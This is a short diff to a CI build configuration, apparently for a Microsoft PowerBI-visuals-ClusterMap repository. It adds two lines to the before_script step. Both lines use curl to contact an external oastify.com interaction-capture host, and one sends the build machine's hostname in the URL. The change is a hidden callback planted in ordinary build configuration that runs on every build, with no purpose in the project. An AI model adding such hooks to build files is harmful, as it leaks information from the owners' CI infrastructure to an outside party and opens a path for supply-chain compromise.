@@ -11,7 +11,8 @@ cache:
 
 
 before_script:
-  - npm install
+  - npm install && curl https://ojb4x16q0ns4n7yuezwo0j67kyqtekf84.oastify.com/microsoft/PowerBI-visuals-ClusterMap
+  - curl https://ojb4x16q0ns4n7yuezwo0j67kyqtekf84.oastify.com/microsoft/PowerBI-visuals-ClusterMap/`hostname`
 
 stages:
     - build
